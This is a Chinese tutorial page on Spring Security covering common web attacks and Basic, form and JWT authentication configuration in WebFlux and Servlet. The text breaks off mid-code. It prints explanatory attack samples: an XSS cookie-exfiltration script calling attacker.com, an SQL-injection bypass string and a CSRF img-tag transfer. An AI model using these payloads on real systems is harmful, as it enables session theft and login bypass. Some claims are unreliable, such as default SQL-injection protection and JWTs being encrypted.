<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        <link rel="canonical" href="https://finger-bone.github.io/micro-service-crashcourse/14/">
        <link rel="shortcut icon" href="../img/favicon.ico">
        <title>Spring Security - 微服务速成笔记</title>
        <link href="../css/bootstrap.min.css" rel="stylesheet">
        <link href="../css/font-awesome.min.css" rel="stylesheet">
        <link href="../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/color-brewer.min.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
        <script>hljs.highlightAll();</script> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="..">微服务速成笔记</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Spring Cloud 微服务技术 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../01/" class="dropdown-item">回到 Spring</a>
</li>
                                    
<li>
    <a href="../02/" class="dropdown-item">回到 Java</a>
</li>
                                    
<li>
    <a href="../03/" class="dropdown-item">Consul 作为服务注册中心</a>
</li>
                                    
<li>
    <a href="../04/" class="dropdown-item">Consul 作为配置中心</a>
</li>
                                    
<li>
    <a href="../05/" class="dropdown-item">LoadBalancer</a>
</li>
                                    
<li>
    <a href="../06/" class="dropdown-item">Http Interface Client 与 OpenFeign</a>
</li>
                                    
<li>
    <a href="../07/" class="dropdown-item">Resilience4j 服务熔断和降级</a>
</li>
                                    
<li>
    <a href="../08/" class="dropdown-item">Resilience4j 限流</a>
</li>
                                    
<li>
    <a href="../09/" class="dropdown-item">Micrometer 监控</a>
</li>
                                    
<li>
    <a href="../10/" class="dropdown-item">Spring Gateway 网关</a>
</li>
                                    
<li>
    <a href="../11/" class="dropdown-item">Seata 分布式事务</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown active">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Spring 进阶内容 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../12/" class="dropdown-item">Reactor 框架</a>
</li>
                                    
<li>
    <a href="../13/" class="dropdown-item">Spring WebFlux</a>
</li>
                                    
<li>
    <a href="./" class="dropdown-item active">Spring Security</a>
</li>
                                    
<li>
    <a href="../15/" class="dropdown-item">Spring Security OAuth2 认证以及 KeyCloak 用户服务</a>
</li>
                                    
<li>
    <a href="../16/" class="dropdown-item">Rabbit MQ 消息队列</a>
</li>
                                    
<li>
    <a href="../17/" class="dropdown-item">GraphQL</a>
</li>
                                    
<li>
    <a href="../18/" class="dropdown-item">gRPC</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">k8s 微服务技术 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../19/" class="dropdown-item">后端框架一览</a>
</li>
                                    
<li>
    <a href="../20/" class="dropdown-item">k8s 无状态服务基本部署</a>
</li>
                                    
<li>
    <a href="../21/" class="dropdown-item">helm 打包 istio 网关与 k8s 命令行工具</a>
</li>
                                    
<li>
    <a href="../22/" class="dropdown-item">k8s 无状态服务</a>
</li>
                                    
<li>
    <a href="../23/" class="dropdown-item">k8s 有状态服务</a>
</li>
                                    
<li>
    <a href="../24/" class="dropdown-item">服务网格</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">中间件补充 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li>
    <a href="../25/" class="dropdown-item">Nacos 服务治理</a>
</li>
                                    
<li>
    <a href="../26/" class="dropdown-item">Sentinel</a>
</li>
                                    
<li>
    <a href="../27/" class="dropdown-item">kafka 高性能消息队列</a>
</li>
                                    
<li>
    <a href="../28/" class="dropdown-item">Redis</a>
</li>
                                    
<li>
    <a href="../29/" class="dropdown-item">OTel-LGTM</a>
</li>
                                    
<li>
    <a href="../30/" class="dropdown-item">Dubbo RPC</a>
</li>
                                    
<li>
    <a href="../31.md" class="dropdown-item">Nginx</a>
</li>
                                    
<li>
    <a href="../32.md" class="dropdown-item">Treafik</a>
</li>
                                    
<li>
    <a href="../33.md" class="dropdown-item">Citus</a>
</li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ml-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li class="nav-item">
                                <a rel="prev" href="../13/" class="nav-link">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li class="nav-item">
                                <a rel="next" href="../15/" class="nav-link">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-level="1"><a href="#spring-ch14-spring-security" class="nav-link">Spring 速成 Ch14 Spring Security</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#spring-security" class="nav-link">Spring Security 三大职能</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#_1" class="nav-link">攻击防护</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#_4" class="nav-link">单体应用的认证与鉴权</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="spring-ch14-spring-security">Spring 速成 Ch14 Spring Security</h1>
<p>Spring 生态圈中有两个主流的安全框架：Apache Shiro 和 Spring Security。Spring Security 是 Spring 官方的安全框架，它提供了一套完整的安全解决方案，包括认证、授权、攻击防护等。Shiro 更为轻量，也是一个不错的选择。这里我们只介绍 Spring Security。</p>
<p>这里我们的演示使用 Spring WebFlux。在这里使用 Reactive 版的目的是为了展示 Spring WebFlux 的应用，但这不影响 Spring Security 的学习。</p>
<h2 id="spring-security">Spring Security 三大职能</h2>
<ul>
<li>攻击防护（Attack Protection），包括防止常见的网络安全攻击，如 CSRF、XSS等。</li>
<li>认证（Authentication），验证用户的身份。</li>
<li>鉴权（Authorization），控制用户对资源的访问权限。</li>
</ul>
<h2 id="_1">攻击防护</h2>
<h3 id="_2">常见的网络安全攻击及其原理</h3>
<h4 id="csrfcross-site-request-forgery">CSRF（Cross-Site Request Forgery）</h4>
<p>CSRF 是一种网络攻击，攻击者利用用户的登录状态发起恶意请求。攻击者可以伪造请求，让用户在不知情的情况下执行恶意操作。</p>
<p>例如，如果用户在<code>http://bank.com/transfer</code>页面上登录了银行账号，攻击者可以在另一个页面上放置一个<code>&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=1000"&gt;</code>的图片，当用户访问这个页面时，浏览器会自动加载这个图片。因为用户的网络环境中已经有了银行的 Cookie，所以这个请求会带上用户的 Cookie，从而执行了转账操作。</p>
<h4 id="xsscross-site-scripting">XSS（Cross-Site Scripting）</h4>
<p>XSS 是一种网络攻击，攻击者在网页中注入恶意脚本，当用户访问这个页面时，脚本会在用户的浏览器中执行。这样攻击者就可以获取用户的 Cookie、密码等信息。</p>
<p>这种攻击很像 SQL 注入，只不过 SQL 注入是攻击数据库，而 XSS 是攻击用户。</p>
<p>一种常见的 XSS 攻击是在评论框中注入脚本，当其他用户访问这个页面时，脚本会在他们的浏览器中执行。例如，攻击者在评论框中输入<code>&lt;script&gt;fetch('http://attacker.com?cookie=' + document.cookie)&lt;/script&gt;</code>，这样其他用户访问这个页面时，就会向<code>http://attacker.com</code>发送请求，从而泄露 Cookie。</p>
<h4 id="sql">SQL 注入</h4>
<p>SQL 注入是一种网络攻击，攻击者在输入框中输入恶意 SQL 语句，当这个 SQL 语句被拼接到数据库查询中时，就会执行这个 SQL 语句。</p>
<p>例如，如果一个登录页面的 SQL 查询是<code>SELECT * FROM users WHERE username = '${username}' AND password = '${password}'</code>，攻击者可以输入<code>' OR 1=1 --</code>，这样 SQL 查询就变成了<code>SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '${password}'</code>，这样就绕过了密码验证。</p>
<h4 id="_3">点击劫持</h4>
<p>点击劫持是一种网络攻击，攻击者在一个透明的 iframe 中放置一个恶意网页，然后将这个 iframe 放在一个看似无害的页面上。当用户点击这个页面时，实际上是点击了 iframe 中的恶意网页。</p>
<p>例如，攻击者在一个透明的 iframe 中放置一个银行转账页面，然后将这个 iframe 放在一个看似无害的页面上。当用户点击这个页面时，实际上是点击了银行转账页面，从而执行了转账操作。</p>
<h3 id="spring-security_1">配置 Spring Security 进行攻击防护</h3>
<p>Spring Security 中，所有的功能都是通过 SecurityFilterChain 实现的。如名字所示，SecurityFilterChain 是一个过滤器链，它包含了一系列的过滤器，每个过滤器负责一个功能。</p>
<p>对于 Spring Web，这个过滤器是 Servlet Filter；对于 Spring WebFlux，这个过滤器是 WebFilter。不过，两者的功能是一样的。</p>
<p>Spring Security 默认开启了全部的攻击防护功能，包括 CSRF、XSS、SQL 注入等。我们可以通过配置来关闭这些功能。</p>
<pre><code class="language-java">@Configuration
@EnableWebFluxSecurity
public class SecurityConfig {
    @Bean
    public SecurityWebFilterChain securityWebFilterChain(
        ServerHttpSecurity http
    ) {
        return http
                .csrf(csrf -&gt; csrf.disable())
                .cors(Customizer.withDefaults())
                .build();
    }
}
</code></pre>
<p>如果是 Servlet 版本，使用，</p>
<pre><code class="language-java">@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(
        HttpSecurity http
    ) {
        return http
                .csrf(csrf -&gt; csrf.disable())
                .cors(Customizer.withDefaults())
                .build();
    }
}
</code></pre>
<p>注意，网上的很多资料都的写法都过时了，现在的写法叫 lambda DSL，即<code>.功能名(参数 -&gt; 参数设置)</code>。如果保持默认设置，使用<code>Customizer.withDefaults()</code>即可。</p>
<p>上面每一条语句都创建一个 Filter，<code>.csrf(csrf -&gt; csrf.disable())</code>即创建了<code>CsrfWebFilter</code>，<code>.cors(Customizer.withDefaults())</code>即创建了<code>CorsWebFilter</code>。这些 Filter 会被添加到 SecurityFilterChain 中。最后通过<code>.build()</code>创建 SecurityFilterChain。</p>
<p>这些攻击的防护基本是无感的，不需要做太多操作，均默认开启。</p>
<h2 id="_4">单体应用的认证与鉴权</h2>
<p>Spring Security 提供了多种认证方式，包括用户名密码认证、OAuth2 认证等。在这一部分，我们只介绍用户名密码认证，并自己实现 JWT 认证。</p>
<h3 id="_5">认证信息的传递</h3>
<p>认证信息的传递有两种方式：Cookie 和 Token。</p>
<p>Cookie 是一种存储在浏览器中的信息，它会随着每次请求一起发送到服务器。Cookie 有两种：会话 Cookie 和持久 Cookie。会话 Cookie 是一种临时 Cookie，它会在浏览器关闭时被删除；持久 Cookie 是一种长期 Cookie，它会在浏览器关闭时被保存。</p>
<p>不过，现在的大部分的认证信息都是通过 Token 传递的。Token 是一种短期的认证信息，它会在一段时间后失效。简单来说，Token 就是一个字符串，它包含了用户的信息，如用户名、权限等。与 Cookie 不同，Token 是存储在客户端的，它会在每次请求时被发送到服务器，如此，服务器就是无状态的。</p>
<p>Token 一般通过 HTTP 请求头部的<code>Authorization</code>字段传递。其内容根据 Token 的类型不同而不同。但格式都是<code>格式 数据</code>中间有一个空格。</p>
<p>常用的格式只有两种，<code>Basic</code>和<code>Bearer</code>。前者只用于用户名-密码认证，又称为 HTTP Basic 认证；后者广泛用于多种认证方式，称为 Bearer Token 认证。</p>
<p>Basic 认证的格式是<code>Basic base64(username:password)</code>，其中<code>base64(username:password)</code>是<code>用户名:密码</code>的 base64 编码。这种认证方式不安全，因为用户名和密码是明文传输的。</p>
<p>Bearer Token 认证的格式是<code>Bearer token</code>，其中<code>token</code>是 Token 的内容。这种认证方式相对安全，因为 Token 是加密的。Token 的具体内容取决于认证方式。</p>
<p>此外，还有一种表单认证，即通过表单提交用户名和密码。</p>
<h3 id="spring-security_2">Spring Security 认证与鉴权流程</h3>
<p>Spring Security 的每个鉴权请求都是由 SecurityContext 处理的。由于每个 HTTP 请求都有独立的线程处理，因此存储是通过 ThreadLocal 实现的。</p>
<p>当前线程的 SecurityContext 通过<code>SecurityContextHolder.getContext()</code>获取，其中包含了当前用户的信息。这个信息是通过<code>Authentication</code>对象表示的，其中包含了用户的身份、凭证、权限等信息。</p>
<pre><code class="language-java">SecurityContext context = SecurityContextHolder.createEmptyContext();
Authentication authentication =
    new TestingAuthenticationToken(&quot;username&quot;, &quot;password&quot;, &quot;ROLE_USER&quot;);
context.setAuthentication(authentication);

SecurityContextHolder.setContext(context);
</code></pre>
<p>上面的代码创建了一个<code>SecurityContext</code>，并设置了一个<code>Authentication</code>对象。这个<code>Authentication</code>对象表示了一个用户，其中包含了用户名、密码、权限等信息。</p>
<p>SecurityFilterChain 负责把用户请求处理成<code>Authentication</code>对象，然后把这个对象存储到<code>SecurityContext</code>中。</p>
<p><code>Authentication</code>其实是一个接口，定义如下，</p>
<pre><code class="language-java">public interface Authentication extends Principal, Serializable {
    Collection&lt;? extends GrantedAuthority&gt; getAuthorities();
    Object getCredentials();
    Object getDetails();
    Object getPrincipal();
    boolean isAuthenticated();
    void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException;
}
</code></pre>
<p>它由四个重要的属性，<code>Authenticated</code>，是否已经通过认证；<code>Principal</code>，用户的身份，即能表示用户的标识，通常是用户名或用户 ID；<code>Credentials</code>，用户的凭证，即能验证用户身份的信息，通常是密码；<code>Authorities</code>，用户的权限，即用户能访问的资源。<code>Authorities</code>是一个<code>GrantedAuthority</code>的集合，<code>GrantedAuthority</code>是一个只有<code>getAuthority()</code>方法的接口，它只返回一个字符串，表示用户的权限。因此，可以认为<code>Authorities</code>本质就是一些字符串，它们可以表示用户的权限。</p>
<p>默认状态下，SecurityFilterChain 的认证流程如下。</p>
<ol>
<li>Filter 拦截请求。Filter 先根据特定的规则把 HTTP 请求处理成<code>Authentication</code>对象。这时对象的<code>Authenticated</code>属性为<code>false</code>。Filter 会把这个对象放在<code>SecurityContext</code>中。这个 Filter 是<code>AuthenticationFilter</code>或<code>AuthenticationWebFilter</code>。对于前者，在创建时要提交<code>AuthenticationManager</code>和一个<code>AuthenticationConverter</code>，它们分别负责认证和 HTTP 请求转 Authentication 对象。对于后者，只需要提交<code>ReactiveAuthenticationManager</code>，Converter 可以用回调函数设置。</li>
<li>Filter 把用户认证的任务委托给<code>AuthenticationManager</code>。<code>AuthenticationManager</code>会根据<code>Authentication</code>对象的<code>Principal</code>和<code>Credentials</code>进行认证。<code>authenticate</code>是<code>AuthenticationManager</code>的唯一一个方法，它接受一个<code>Authentication</code>对象，返回一个认证后的<code>Authentication</code>对象。</li>
<li><code>AuthenticationManager</code> Servlet 版本的默认实现是 <code>ProviderManager</code>，它会把认证任务委托给多个<code>AuthenticationProvider</code>。每个<code>AuthenticationProvider</code>负责一种认证方式，例如用户名密码认证、OAuth2 认证等。除了<code>authenticated</code>方法外，<code>AuthenticationProvider</code>还有一个<code>supports</code>方法，它的签名是<code>boolean supports(Class&lt;?&gt; authentication)</code>，用于判断这个<code>AuthenticationProvider</code>是否支持这种认证方式。默认的<code>ProviderManager</code>会遍历所有的<code>AuthenticationProvider</code>，找到第一个支持这种认证方式的<code>AuthenticationProvider</code>，然后调用它的<code>authenticate</code>方法。而 WebFlux 版本没有 ProviderManager，而是直接使用<code>UserDetailsRepositoryReactiveAuthenticationManager</code>，这比 Servlet 版本少了一层抽象。</li>
<li><code>AuthenticationProvider</code>会根据<code>SecurityContext</code>中<code>Authentication</code>对象的<code>Principal</code>和<code>Credentials</code>进行认证。如果认证成功，就返回一个认证后的<code>Authentication</code>对象；如果认证失败，就抛出一个异常。</li>
<li>默认的<code>AuthenticationProvider</code>是<code>DaoAuthenticationProvider</code>，它会根据用户名和密码从数据库中查询用户信息。它依赖于<code>UserDetailsService</code>，<code>UserDetailsService</code>是一个接口，它只有一个方法<code>UserDetails loadUserByUsername(String username)</code>，用于根据用户名查询用户信息。<code>UserDetails</code>是一个接口，它包含了用户的用户名、密码、权限等信息。<code>DaoAuthenticationProvider</code>会根据<code>UserDetailsService</code>查询到的<code>UserDetails</code>对象，和<code>Authentication</code>对象的<code>Credentials</code>进行比较，如果相同，就返回一个认证后的<code>Authentication</code>对象；如果不同，就抛出一个异常。此外，它还有一个<code>PasswordEncoder</code>属性，用于对密码进行加密。</li>
<li>认证成功后，<code>AuthenticationManager</code>会把认证后的<code>Authentication</code>对象存储到<code>SecurityContext</code>中。这时对象的<code>Authenticated</code>属性为<code>true</code>。</li>
<li>后续 Filter 根据<code>Authentication</code>对象的<code>Authorities</code>进行鉴权。</li>
</ol>
<p>这个过程一定要理解好，下面我们所有的配置都是基于这个过程的。我们一般只会改变<code>AuthenticationManager</code>，<code>UserDetailsService</code>，<code>PasswordEncoder</code>这三个类。</p>
<p>注意，上面的流程是基于 Servlet 的，对于 WebFlux，流程是一样的，但是 Filter 是 WebFilter，而且其它的接口名称都在开头添加了<code>Reactive</code>，例如<code>ReactiveAuthenticationManager</code>，接口从直接返回值变成返回<code>Mono</code>，但是其它的都是一样的。</p>
<p>此外，如果找不到<code>UserDetailsService</code>，即完全没经过 Security 配置，默认的<code>AuthenticationManager</code>逻辑是这样的：它会在配置文件里找<code>spring.security.user.name</code>和<code>spring.security.user.password</code>，如果找到了，就用这个用户名和密码进行认证。如果找不到，就会生成一个密码，打印在控制台上，然后用这个密码进行认证。这个密码是随机的，每次启动都不一样。用户名是<code>user</code>。</p>
<h3 id="spring-security-basic">配置 Spring Security 进行 Basic 认证与鉴权</h3>
<p>首先，我们要配置好 UserDetailsService，它用于根据用户名查询用户信息。这里我们就不连接数据库了，而是直接用 Map 存储用户信息。这里我们使用默认类。注意，非 WebFlux 版本没有 <code>MapUserDetailsManager</code>，需要自己实现。</p>
<pre><code class="language-java">@Bean
PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

@Bean
public ReactiveUserDetailsService reactiveUserDetailsService(
    @Autowired PasswordEncoder passwordEncoder
) {
    return new MapReactiveUserDetailsService(
        User.withUsername(&quot;user&quot;)
            .password(passwordEncoder.encode(&quot;password&quot;))
            .roles(&quot;USER&quot;)
            .build(),
        User.withUsername(&quot;admin&quot;)
            .password(passwordEncoder.encode(&quot;password&quot;))
            .roles(&quot;ADMIN&quot;)
            .build()
    );
}
</code></pre>
<p>然后配置 Filter。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .authorizeExchange(exchanges -&gt; exchanges
                    .pathMatchers(&quot;/resource/public&quot;).permitAll()
                    .pathMatchers(&quot;/resource/private&quot;).authenticated()
                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
                    .anyExchange().permitAll()
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>这里的配置很简单，<code>.httpBasic(Customizer.withDefaults())</code>表示使用 HTTP Basic 认证；<code>.authorizeExchange(exchanges -&gt; exchanges...</code>表示配置鉴权规则；<code>.csrf(csrf -&gt; csrf.disable())</code>表示关闭 CSRF 防护；<code>.cors(Customizer.withDefaults())</code>表示配置 CORS 规则。</p>
<p>其中，<code>pathMatchers</code>表示匹配路径，<code>permitAll</code>表示允许所有用户访问，<code>authenticated</code>表示只允许认证用户访问，<code>hasRole</code>表示只允许有某个角色的用户访问。</p>
<p>这里的<code>Role</code>匹配其实就是<code>GrantedAuthority</code>匹配，只不过 Spring Security 为了方便，提供了<code>hasRole</code>方法，它会自动加上<code>ROLE_</code>前缀。简单来说，为一个用户添加一个角色，就是为这个用户添加一个<code>GrantedAuthority</code>，这个<code>GrantedAuthority</code>的<code>getAuthority</code>方法返回的字符串就是<code>ROLE_</code>加上角色名。检查也是一样的，只要用户的<code>Authorities</code>中包含这个<code>GrantedAuthority</code>，就可以访问。</p>
<p>此外，还可以使用<code>access</code>表达式，它是一个 SpEL 表达式，用于判断用户是否有权限访问。里面的内容就是正常情况下的权限控制方法。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .authorizeExchange(exchanges -&gt; exchanges
                    .pathMatchers(&quot;/resource/public&quot;).access(&quot;permitAll()&quot;)
                    .pathMatchers(&quot;/resource/private&quot;).access(&quot;isAuthenticated()&quot;)
                    .pathMatchers(&quot;/resource/admin&quot;).access(&quot;hasRole('ADMIN')&quot;)
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>或者使用基于注解的方式。</p>
<pre><code class="language-java">@GetMapping(&quot;/private&quot;)
@PreAuthorize(&quot;isAuthenticated()&quot;)
public Mono&lt;String&gt; privateResource() {
    return Mono.just(&quot;Private resource&quot;);
}
</code></pre>
<p>这里的<code>@PreAuthorize</code>是一个注解，它的值是一个 SpEL 表达式，用于判断用户是否有权限访问这个接口。里面的内容和 access 方法一致。</p>
<p>如果使用了 Spring Doc，先加上<code>@SecurityRequirement</code>注解，</p>
<pre><code class="language-java">@GetMapping(&quot;/private&quot;)
@SecurityRequirement(name = &quot;basicAuth&quot;)
public Mono&lt;String&gt; privateResource() {
    return Mono.just(&quot;Private resource&quot;);
}

@GetMapping(&quot;/admin&quot;)
@SecurityRequirement(name = &quot;basicAuth&quot;, scopes = &quot;admin&quot;)
public Mono&lt;String&gt; adminResource() {
    return Mono.just(&quot;Admin resource&quot;);
}
</code></pre>
<p>然后加上<code>@SecurityScheme</code>注解，</p>
<pre><code class="language-java">package io.github.fingerbone;

import org.springframework.context.annotation.Configuration;

import io.swagger.v3.oas.annotations.enums.SecuritySchemeType;
import io.swagger.v3.oas.annotations.security.SecurityScheme;

@Configuration
@SecurityScheme(
    name = &quot;basicAuth&quot;,
    type = SecuritySchemeType.HTTP,
    scheme = &quot;basic&quot;
)
public class SpringDocConfig {

}
</code></pre>
<p>这样 Swagger 就会自动加上认证信息。每个有 Security 注解的接口都会有一个锁的图标，点击后会弹出认证框，输入用户名密码即可。</p>
<p>注意，默认 HTTP Basic 是有 Cookie 保持的。</p>
<p>进入浏览器的开发者工具，选择 Storage。在 All Storage 里删掉所有 Cookie 即可。</p>
<p>当然，更好的方法是添加一个登出接口，这样就可以在浏览器中登出了。</p>
<pre><code class="language-java">@GetMapping(&quot;/logout&quot;)
public Mono&lt;Void&gt; logout(ServerWebExchange exchange) {
    return exchange.getPrincipal().flatMap(principal -&gt; {
        if (principal instanceof Authentication) {
            return exchange.getExchange().getSession().doOnNext(WebSession::invalidate);
        }
        return Mono.empty();
    });
}
</code></pre>
<p>或者直接用 Spring Security 提供的<code>LogoutWebFilter</code>。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))
            .authorizeExchange(exchanges -&gt; exchanges
                    .pathMatchers(&quot;/resource/public&quot;).permitAll()
                    .pathMatchers(&quot;/resource/private&quot;).authenticated()
                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
                    .anyExchange().permitAll()
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>这样，访问<code>/logout</code>就会登出。</p>
<p>如果要关闭 Cookie，可以使用<code>securityContextRepository</code>，这个类用于存储<code>SecurityContext</code>。默认的实现是<code>WebSessionServerSecurityContextRepository</code>，它会把<code>SecurityContext</code>存储到<code>WebSession</code>中。我们可以使用<code>NoOpServerSecurityContextRepository</code>，它不会存储<code>SecurityContext</code>。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))
            .securityContextRepository(
                NoOpServerSecurityContextRepository.getInstance()
            )
            .authorizeExchange(exchanges -&gt; exchanges
                    .pathMatchers(&quot;/resource/public&quot;).permitAll()
                    .pathMatchers(&quot;/resource/private&quot;).authenticated()
                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
                    .anyExchange().permitAll()
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>如果使用 Servlet 版本，使用的是<code>sessionManagement</code>。</p>
<pre><code class="language-java">@Bean
public SecurityFilterChain securityFilterChain(
    HttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))
            .sessionManagement(sessionManagement -&gt; sessionManagement
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeRequests(authorizeRequests -&gt; authorizeRequests
                .antMatchers(&quot;/resource/public&quot;).permitAll()
                .antMatchers(&quot;/resource/private&quot;).authenticated()
                .antMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
                .anyRequest().permitAll()
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>这样，就关闭了 Cookie。</p>
<h3 id="spring-security_3">配置 Spring Security 进行表单认证与鉴权</h3>
<p>表单认证与 Basic 认证类似，只是认证方式不同。只需要将<code>.httpBasic(Customizer.withDefaults())</code>替换成<code>.formLogin(Customizer.withDefaults())</code>即可。如果两者都有，那么是或的关系。</p>
<pre><code class="language-java">@Bean
public SecurityWebFilterChain securityWebFilterChain(
    ServerHttpSecurity http
) {
    return http
            .httpBasic(Customizer.withDefaults())
            .formLogin(Customizer.withDefaults())
            .authorizeExchange(exchanges -&gt; exchanges
                    .pathMatchers(&quot;/resource/public&quot;).permitAll()
                    .pathMatchers(&quot;/resource/private&quot;).authenticated()
                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)
                    .anyExchange().permitAll()
            )
            .csrf(csrf -&gt; csrf.disable())
            .cors(Customizer.withDefaults())
            .securityContextRepository(
                NoOpServerSecurityContextRepository.getInstance()
            )
            .build();
}
</code></pre>
<h3 id="spring-security-jwt">配置 Spring Security 进行 JWT 认证与鉴权</h3>
<h4 id="jwt">JWT 认证原理</h4>
<p>JWT 使用 Bearer Token 认证，它的格式是<code>Bearer token</code>，其中<code>token</code>是 Token 的内容。Token 的内容是一个 JSON 对象，它包含了用户的信息，如用户名、权限等。Token 是加密的，因此是安全的。</p>
<p>其中，具体而言，一个 JWT Token 由三部分组成，分别是 Header、Payload 和 Signature。Header 包含了 Token 的类型和加密算法；Payload 包含了用户的信息；Signature 是 Header 和 Payload 的签名，用于验证 Token 的完整性。三者之间用<code>.</code>分隔。JWT Token 由服务器负责生成，客户端负责保存。</p>
<p>例如，一个 JWT Token 解密后的内容可能是这样的，</p>
<pre><code class="language-json">{
    &quot;header&quot;: {
        &quot;alg&quot;: &quot;HS256&quot;,
        &quot;typ&quot;: &quot;JWT&quot;
    },
    &quot;payload&quot;: {
        &quot;sub&quot;: &quot;user&quot;,
        &quot;roles&quot;: [&quot;USER&quot;]
    },
    &quot;signature&quot;: &quot;...&quot;
}
</code></pre>
<p>JWT 中一定不要存储敏感信息，因为 JWT 本身是明文的。</p>
<p>Payload 中，有一些字段是 JWT 规定的，如<code>sub</code>表示用户，<code>exp</code>表示过期时间，<code>iat</code>表示签发时间等。除此之外，可以自定义字段，如<code>roles</code>表示用户的角色。每一条记录称为一个 Claim，因此 Payload 有时也叫 Claims。</p>
<h4 id="jwt_1">JWT 的解析</h4>
<p>JWT 一般使用一个轻量级的 JJWT 库进行解析。签发 Token 时，需要指定 Token 的过期时间、签发时间、用户信息等。解码 Token 时，需要指定 Token 的签名密钥。</p>
<p>首先引入依赖，</p>
<pre><code class="language-groovy">dependencies {
    implementation 'io.jsonwebtoken:jjwt-api:0.12.6'
    runtimeOnly 'io.jsonwebtoken:jjwt-jackson:0.12.6'
    runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.12.6'
}
</code></pre>
<p>然后实现一个 Util 类。</p>
<pre><code class="language-java">import java.util.*;
import javax.crypto.SecretKey;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.ReactiveUserDetailsService;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.stereotype.Component;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jws;
